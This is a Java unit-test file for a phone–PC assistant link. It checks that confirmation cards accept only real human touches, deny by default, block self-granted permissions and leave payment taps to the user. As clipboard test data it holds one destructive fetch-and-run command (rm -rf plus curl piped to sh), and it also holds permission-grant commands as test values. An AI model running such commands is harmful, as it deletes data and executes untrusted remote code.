package com.onesay.assistant.v2.pclink;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicLong;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;

/**
 * [approve-not-block] 手机这一侧（自用版 / 开源版同一套）：
 * 手机屏幕确认卡的规则（0.7 秒防误点、60 秒默认拒绝、只认真人手指、语音 / 无障碍 / 遮挡 / 机器人都不算、「以后这类不用问」）；
 * 电脑 → 手机原来拒的改成弹卡、硬规则照旧；电脑上的确认发到手机后，手机卡回签名的 confirm_answer；60 秒清除默认关；付款最后一下机器人不点。
 */
public class ApproveNotBlockPhoneTest {

    static final AtomicLong T = new AtomicLong(1_000_000L);

    @Before public void fakeClock() {
        PcConfirm.reset();
        T.set(1_000_000L);
        PcConfirm.clock = new PcConfirm.Clock() {
            @Override public long now() { return T.get(); }
        };
    }

    @After public void realClock() {
        PcConfirm.reset();
        PcConfirm.ui = null;
        PcConfirm.clock = new PcConfirm.Clock() {
            @Override public long now() { return System.currentTimeMillis(); }
        };
    }

    static final class Ui implements PcConfirm.Ui {
        final List<PcConfirm.Card> opened = new CopyOnWriteArrayList<PcConfirm.Card>();
        final List<Integer> closed = new CopyOnWriteArrayList<Integer>();

        @Override public void open(PcConfirm.Card c) { opened.add(c); }

        @Override public void close(PcConfirm.Card c) { closed.add(Integer.valueOf(c.id)); }
    }

    static Map<String, Object> m(Object... kv) {
        Map<String, Object> x = new TreeMap<String, Object>();
        for (int i = 0; i < kv.length; i += 2) x.put((String) kv[i], kv[i + 1]);
        return x;
    }

    // ================================================================== 确认卡规则（假时钟，电脑卡走 offer，不阻塞）

    static final class Sent {
        final List<String> got = new ArrayList<String>();
        final PcConfirm.Reply reply = new PcConfirm.Reply() {
            @Override public void send(PcConfirm.Card c, boolean allow, boolean always, boolean remember, long shownMs) {
                got.add(allow + "," + always + "," + remember + "," + shownMs);
            }
        };
    }

    @Test public void cardOnlyCountsHumanTouchAfterArming() {
        Ui ui = new Ui();
        PcConfirm.ui = ui;
        Sent s = new Sent();
        PcConfirm.Card c = PcConfirm.offer("pc", 7, "tok-0123456789abcdef", "执行命令：dir", "pc.shell_exec", false, 60000, s.reply);
        assertNotNull(c);
        assertEquals(1, ui.opened.size());
        assertEquals("重复发来的同一张不再开", c, PcConfirm.offer("pc", 7, "tok-0123456789abcdef", "x", "", false, 60000, s.reply));
        assertEquals(PcConfirm.Answer.NOT_SHOWN, PcConfirm.answer(c.id, true, false, false, PcConfirm.Input.TOUCH));
        PcConfirm.shown(c.id, true);
        assertEquals("0.7 秒内不算", PcConfirm.Answer.TOO_EARLY, PcConfirm.answer(c.id, true, false, false, PcConfirm.Input.TOUCH));
        T.addAndGet(LinkPolicy.CONFIRM_ARM_MS);
        for (PcConfirm.Input in : new PcConfirm.Input[]{PcConfirm.Input.VOICE, PcConfirm.Input.ACCESSIBILITY, PcConfirm.Input.OBSCURED, PcConfirm.Input.ROBOT,
                PcConfirm.Input.REMOTE, PcConfirm.Input.UNKNOWN})
            assertEquals(in.toString(), PcConfirm.Answer.NOT_HUMAN, PcConfirm.answer(c.id, true, false, true, in));
        // 失焦再回来：重新等 0.7 秒
        PcConfirm.focus(c.id, false);
        assertEquals(PcConfirm.Answer.TOO_EARLY, PcConfirm.answer(c.id, true, false, false, PcConfirm.Input.TOUCH));
        PcConfirm.focus(c.id, true);
        assertEquals(PcConfirm.Answer.TOO_EARLY, PcConfirm.answer(c.id, true, false, false, PcConfirm.Input.TOUCH));
        T.addAndGet(LinkPolicy.CONFIRM_ARM_MS);
        // 机器人刚注入过手势：这一会儿的触摸不算
        PcConfirm.noteRobotInput();
        assertEquals(PcConfirm.Answer.NOT_HUMAN, PcConfirm.answer(c.id, true, false, false, PcConfirm.Input.TOUCH));
        T.addAndGet(PcConfirm.ROBOT_WINDOW_MS + 1);
        assertEquals(PcConfirm.Answer.ACCEPTED, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH));
        assertEquals(1, s.got.size());
        assertTrue(s.got.get(0), s.got.get(0).startsWith("true,false,true,"));
        long shown = Long.parseLong(s.got.get(0).split(",")[3]);
        assertTrue("手机上显示了多久带回电脑", shown >= 2 * LinkPolicy.CONFIRM_ARM_MS);
        assertNull(PcConfirm.card(c.id));
        assertEquals(1, ui.closed.size());
        assertEquals("答过了再点不算", PcConfirm.Answer.GONE, PcConfirm.answer(c.id, true, false, false, PcConfirm.Input.TOUCH));
    }

    @Test public void cardDefaultsToDeny() {
        PcConfirm.ui = new Ui();
        Sent s = new Sent();
        // 拒绝从哪来都收（不用等解锁）
        PcConfirm.Card a = PcConfirm.offer("pc", 1, "tok-0123456789abcdef", "关机", "pc.power", false, 60000, s.reply);
        assertEquals(PcConfirm.Answer.ACCEPTED, PcConfirm.answer(a.id, false, false, true, PcConfirm.Input.VOICE));
        assertEquals("false,false,false,0", s.got.get(0));
        // 返回键 / 页面关掉 = 拒绝
        PcConfirm.Card b = PcConfirm.offer("pc", 2, "tok-0123456789abcdef", "关机", "", false, 60000, s.reply);
        PcConfirm.dismissed(b.id);
        assertTrue(s.got.get(1).startsWith("false"));
        // 60 秒没人点 = 结束（电脑那边自己按超时拒绝，手机不回）
        PcConfirm.Card c = PcConfirm.offer("pc", 3, "tok-0123456789abcdef", "关机", "", false, 120000, s.reply);
        assertEquals("最长 60 秒", T.get() + LinkPolicy.CONFIRM_TIMEOUT_MS, c.deadline);
        PcConfirm.shown(c.id, true);
        T.addAndGet(LinkPolicy.CONFIRM_TIMEOUT_MS - 1);
        assertEquals(0, PcConfirm.expire());
        T.addAndGet(1);
        assertEquals(1, PcConfirm.expire());
        assertEquals(PcConfirm.Answer.GONE, PcConfirm.answer(c.id, true, false, false, PcConfirm.Input.TOUCH));
        assertEquals(2, s.got.size());
        // 电脑说结束了：收卡
        PcConfirm.Card d = PcConfirm.offer("pc", 4, "tok-0123456789abcdef", "关机", "", false, 60000, s.reply);
        PcConfirm.closePc("pc", 4);
        assertNull(PcConfirm.card(d.id));
        PcConfirm.offer("pc", 5, "tok-0123456789abcdef", "x", "", false, 60000, s.reply);
        PcConfirm.closePc("other-pc", 5); // 别的电脑关不了这张
        assertEquals(1, PcConfirm.pending().size());
        // 短 token / 没界面：不开卡
        assertNull(PcConfirm.offer("pc", 6, "short", "x", "", false, 60000, s.reply));
        PcConfirm.ui = null;
        assertNull(PcConfirm.offer("pc", 8, "tok-0123456789abcdef", "x", "", false, 60000, s.reply));
        assertEquals("本机卡没界面 = 没人确认", PcConfirm.TIMEOUT, PcConfirm.ask("t", "d", "", 60000));
    }

    @Test public void rememberOnlyWhenOfferedAndNeverForUnknownKinds() {
        PcConfirm.ui = new Ui();
        Sent s = new Sent();
        PcConfirm.Card c = PcConfirm.offer("pc", 9, "tok-0123456789abcdef", "x", "made.up.kind", false, 60000, s.reply);
        assertEquals("不认识的类型不给勾选", "", c.rememberKind);
        PcConfirm.shown(c.id, true);
        T.addAndGet(LinkPolicy.CONFIRM_ARM_MS);
        PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH);
        assertTrue("勾了也只算允许一次", s.got.get(0).startsWith("true,false,false"));
        assertEquals("电脑：执行命令", LinkPolicy.kindZh("pc.shell_exec"));
    }

    @Test public void voiceCannotApprove() {
        assertTrue(PcConfirm.spokenApproval("好的"));
        assertTrue(PcConfirm.spokenApproval("允许吧"));
        assertTrue(PcConfirm.spokenApproval("以后这类不用问"));
        assertFalse(PcConfirm.spokenApproval("打开微信"));
        assertEquals("没有卡在等：普通的话照常", PcVoice.Kind.NONE, PcVoice.of("好的"));
        PcConfirm.ui = new Ui();
        PcConfirm.offer("pc", 1, "tok-0123456789abcdef", "x", "", false, 60000, new Sent().reply);
        assertEquals("有卡在等：说「好的」不算批准", PcVoice.Kind.APPROVAL, PcVoice.of("好的"));
        assertEquals(PcVoice.Kind.APPROVAL, PcVoice.of("允许"));
        assertEquals(PcVoice.Kind.LOCK, PcVoice.of("电脑锁屏"));
        // 远程「回答确认框」的指令手机上不认、也是 voice_approval_blocked 类
        assertEquals(LinkPolicy.Cat.REMOTE_APPROVAL, LinkPolicy.phoneCat("approve"));
    }

    // ================================================================== 电脑 → 手机：原来拒的改成弹卡；硬规则照旧

    static final class AskStub implements PcRx.Handler, PcRx.Guard, PcRx.Asker {
        final List<String> ran = new ArrayList<String>();
        final List<String> asked = new ArrayList<String>();
        final List<String> kinds = new ArrayList<String>();
        int answer = PcConfirm.TIMEOUT;
        boolean autoClear;
        final File ws;

        AskStub(File ws) { this.ws = ws; }

        @Override public boolean enabled(String cmd) { return true; }

        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
            ran.add(cmd + args);
            return new PcLanClient.Result(true, "好了", null, "");
        }

        @Override public void record(String cmd, boolean ok, String text) { }

        @Override public void appFacts(String cmd, Map<String, Object> a, LinkPolicy.Facts f) {
            String pkg = PcRxPolicy.str(a, "package");
            f.appSystem = pkg.startsWith("com.android.");
            f.appSelf = "com.onesay.me".equals(pkg);
            f.appBlocked = f.appBlocked || LinkPolicy.blockedApp(pkg, PcRxPolicy.str(a, "name"));
        }

        @Override public File workspace() { return ws; }

        @Override public String script(String cmd, Map<String, Object> a, String why) {
            return LinkPolicy.writeScript(ws, LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, cmd, why, "授权", PcRxPolicy.str(a, "command"), System.currentTimeMillis()));
        }

        @Override public int ask(String title, String detail, String rememberKind) {
            asked.add(rememberKind + "|" + detail);
            return answer;
        }

        @Override public java.util.Collection<String> rememberedKinds() { return kinds; }

        @Override public void remember(String kind) { kinds.add(kind); }

        @Override public boolean clipAutoClear() { return autoClear; }
    }

    static String reason(PcLanClient.Result r) {
        return r.data == null || r.data.get("reason") == null ? "" : String.valueOf(r.data.get("reason"));
    }

    @Test public void phoneAsksInsteadOfBlockingAndRemembers() throws Exception {
        AskStub h = new AskStub(Files.createTempDirectory("anb-ws").toFile());
        h.answer = PcConfirm.DENY;
        assertEquals(LinkPolicy.R_CONFIRM_DENIED, reason(PcRx.handle(h, "open_app", m("package", "com.eg.android.AlipayGphone"))));
        assertEquals(1, h.asked.size());
        assertTrue(h.asked.get(0), h.asked.get(0).startsWith("phone.blocked_app.open|打开支付"));
        assertTrue(h.ran.isEmpty());
        h.answer = PcConfirm.ALLOW;
        assertTrue(PcRx.handle(h, "open_app", m("package", "com.eg.android.AlipayGphone")).ok);
        assertEquals(1, h.ran.size());
        h.answer = PcConfirm.TIMEOUT;
        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reason(PcRx.handle(h, "uninstall_app", m("package", "com.android.settings"))));
        h.answer = PcConfirm.REMEMBER;
        assertTrue(PcRx.handle(h, "uninstall_app", m("package", "com.android.settings")).ok);
        assertEquals(java.util.Arrays.asList("phone.system_app"), h.kinds);
        int n = h.asked.size();
        h.answer = PcConfirm.DENY;
        assertTrue("记住了：同类不再问", PcRx.handle(h, "uninstall_app", m("package", "com.android.calendar")).ok);
        assertTrue("系统命令里 pm 停用系统 App 同一类", PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.android.chrome")).ok);
        assertEquals(n, h.asked.size());
        // 网址：IP 直接开；带账号的问
        assertTrue(PcRx.handle(h, "open_url", m("url", "http://192.168.31.1/")).ok);
        assertEquals(n, h.asked.size());
        assertEquals(LinkPolicy.R_CONFIRM_DENIED, reason(PcRx.handle(h, "open_url", m("url", "https://a:b@example.com/"))));
        assertTrue(h.asked.get(h.asked.size() - 1), h.asked.get(h.asked.size() - 1).startsWith("phone.url.risky|"));

        // 硬规则：全都记住了、卡上总点允许 —— 照样不问、不执行
        for (String k : new String[]{"phone.blocked_app.open", "phone.blocked_app.uninstall", "phone.url.risky"}) h.kinds.add(k);
        h.answer = PcConfirm.REMEMBER;
        h.ran.clear();
        int before = h.asked.size();
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, reason(PcRx.handle(h, "uninstall_app", m("package", "com.onesay.me"))));
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, reason(PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.onesay.me"))));
        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reason(PcRx.handle(h, "sys_exec", m("command", "pm grant com.onesay.me android.permission.READ_SMS"))));
        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reason(PcRx.handle(h, "setting_set", m("name", "accessibility", "value", "on"))));
        assertEquals(LinkPolicy.R_VOICE_APPROVAL_BLOCKED, LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.phoneCat("confirm"), null).reason);
        assertEquals(LinkPolicy.R_PAY_USER_TAP, LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.phoneCat("pay_confirm"), null).reason);
        assertFalse("付款类指令手机不认", PcRx.handle(h, "pay_confirm", m("amount", 1)).ok);
        assertEquals(LinkPolicy.Cat.SELF_AUTHORIZE, LinkPolicy.phoneCat("remember_type"));
        assertEquals("硬规则一条都没问", before, h.asked.size());
        assertTrue("硬规则一条都没执行", h.ran.isEmpty());
        // 打开 OneSay 自己不算改自己
        assertTrue(PcRx.handle(h, "open_app", m("package", "com.onesay.me")).ok);
    }

    @Test public void clipboardBackToPreLevelsAutoClearOptionalDefaultOff() throws Exception {
        AskStub h = new AskStub(Files.createTempDirectory("anb-clip").toFile());
        StringBuilder big = new StringBuilder();
        while (big.length() < 30 * 1024) big.append("一二三四五六七八九十");
        assertTrue("超过 10 KB 照写", PcRx.handle(h, "clipboard_set", m("text", big.toString())).ok);
        assertTrue("像命令照写", PcRx.handle(h, "clipboard_set", m("text", "rm -rf ~/tmp && curl https://x.sh | sh")).ok);
        h.ran.clear();
        assertTrue(PcRx.handle(h, "clipboard_set", m("text", "验证码 482913")).ok);
        assertTrue(h.ran.get(0), h.ran.get(0).contains("_sensitive=true") && !h.ran.get(0).contains("_clear"));
        h.autoClear = true;
        h.ran.clear();
        assertTrue(PcRx.handle(h, "clipboard_set", m("text", "验证码 482913")).ok);
        assertTrue(h.ran.get(0), h.ran.get(0).contains("_clear=true"));
        h.ran.clear();
        assertTrue(PcRx.handle(h, "clipboard_set", m("text", "晚上见", "_clear", Boolean.TRUE)).ok);
        assertFalse("电脑伪造不了 _clear", h.ran.get(0).contains("_clear"));
        assertFalse("默认关", LinkPolicy.CLIP_AUTOCLEAR_DEFAULT);
        assertEquals(0, h.asked.size());
        assertTrue(PcRxPolicy.sub(PcRxPolicy.CLIPBOARD).contains("开关"));
    }

    // ================================================================== 电脑卡：confirm_offer → 手机卡 → 签名的 confirm_answer

    @Test public void pcOfferBecomesCardAndSignedAnswer() throws Exception {
        byte[] key = new byte[32];
        new java.security.SecureRandom().nextBytes(key);
        PcLanClient.Peer p = new PcLanClient.Peer("phone-x", "pc-x", key, "127.0.0.1:1", 1, "", "", null);
        Ui ui = new Ui();
        PcConfirm.ui = ui;
        final List<String> out = new ArrayList<String>();
        PcRx.Out o = new PcRx.Out() {
            @Override public void send(String text) { out.add(text); }
        };
        PcProtocol.ReplayGuard g = new PcProtocol.ReplayGuard();
        long now = System.currentTimeMillis();
        Map<String, Object> b = m("kind", "confirm_offer", "cid", Long.valueOf(42), "token", "tok-0123456789abcdefgh", "cmd", "sys_exec", "detail", "phone-x 请求：执行命令：dir",
                "always", Boolean.FALSE, "remember_kind", "pc.shell_exec", "timeout_ms", Long.valueOf(59000));
        // 签名不对：不开卡
        String bad = fr(new byte[32], "m1", "pc-x", "phone-x", b, now);
        assertNull(PcRx.onFrame(p, g, null, bad, now, o));
        assertTrue(ui.opened.isEmpty());
        // 别的设备发来的：不开卡
        assertNull(PcRx.onFrame(p, g, null, fr(key, "m2", "pc-y", "phone-x", b, now), now, o));
        assertTrue(ui.opened.isEmpty());
        // 正常
        String id = "m3";
        assertNull(PcRx.onFrame(p, g, null, fr(key, id, "pc-x", "phone-x", b, now), now, o));
        assertEquals(1, ui.opened.size());
        PcConfirm.Card c = ui.opened.get(0);
        assertEquals(42L, c.pcId);
        assertEquals("pc.shell_exec", c.rememberKind);
        // 电脑重发同一张（同一个编号）：不再开
        assertNull(PcRx.onFrame(p, g, null, fr(key, id, "pc-x", "phone-x", b, now), now, o));
        PcConfirm.shown(c.id, true);
        T.addAndGet(LinkPolicy.CONFIRM_ARM_MS + 50);
        assertEquals(PcConfirm.Answer.ACCEPTED, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH));
        assertEquals(1, out.size());
        Map<String, Object> env = PcJson.obj(out.get(0));
        @SuppressWarnings("unchecked") Map<String, Object> ab = (Map<String, Object>) env.get("body");
        assertEquals("pc-x", env.get("to"));
        assertEquals(PcProtocol.Check.OK, PcProtocol.verify(key, String.valueOf(env.get("id")), "phone-x", "pc-x", ab, System.currentTimeMillis(), null));
        assertEquals("confirm_answer", ab.get("kind"));
        assertEquals(42L, ((Number) ab.get("cid")).longValue());
        assertEquals("tok-0123456789abcdefgh", ab.get("token"));
        assertEquals("touch", ab.get("input"));
        assertEquals(Boolean.TRUE, ab.get("allow"));
        assertEquals(Boolean.TRUE, ab.get("remember"));
        assertTrue(((Number) ab.get("shown_ms")).longValue() >= LinkPolicy.CONFIRM_ARM_MS);
        // 电脑说收卡
        assertNull(PcRx.onFrame(p, g, null, fr(key, "m4", "pc-x", "phone-x",
                m("kind", "confirm_offer", "cid", Long.valueOf(43), "token", "tok-0123456789abcdefgh", "detail", "x", "timeout_ms", Long.valueOf(59000)), now), now, o));
        assertEquals(1, PcConfirm.pending().size());
        assertNull(PcRx.onFrame(p, g, null, fr(key, "m5", "pc-x", "phone-x", m("kind", "confirm_close", "cid", Long.valueOf(43)), now), now, o));
        assertEquals(0, PcConfirm.pending().size());
        assertEquals("收卡不回答", 1, out.size());
        // 旧调用口（没有 out）不开电脑卡
        assertNull(PcRx.onFrame(p, g, null, fr(key, "m6", "pc-x", "phone-x", b, now), now));
        assertEquals(0, PcConfirm.pending().size());
    }

    /** 一帧：外层 id 和签名用的是同一个。 */
    static String fr(byte[] key, String id, String from, String to, Map<String, Object> body, long now) {
        Map<String, Object> f = new TreeMap<String, Object>();
        f.put("type", "msg");
        f.put("from", from);
        f.put("to", to);
        f.put("id", id);
        f.put("body", PcProtocol.seal(key, id, from, to, body, now));
        return PcJson.stringify(f);
    }
}
